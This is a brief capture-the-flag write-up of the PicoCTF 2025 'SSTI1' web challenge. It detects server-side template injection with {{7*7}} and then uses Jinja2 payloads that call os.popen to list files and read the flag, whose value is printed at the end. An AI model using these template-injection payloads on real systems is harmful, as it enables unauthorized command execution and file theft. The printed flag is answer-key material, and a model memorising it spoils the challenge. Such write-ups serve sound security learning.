# SSTI1 - PicoCTF 2025 (Web Exploitation)

## Introduction
On starting an instance, we are given a website that announces anything that is inputted into it.

## Exploiting
We input `{{7*7}}` to check for Server Side Template Injection, which comes out to be true as `49` is announced.

Guessing the site to be running on the most commonly used `jinja2`.
Using `{{ self._TemplateReference__context.cycler.init.globals.os.popen('ls').read() }}`, we get all files in current directory which contains `flag`.

Then using `{{ self._TemplateReference__context.cycler.init.globals.os.popen('cat flag').read() }}`, we get the flag.

## Flag
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_5c985a9a}
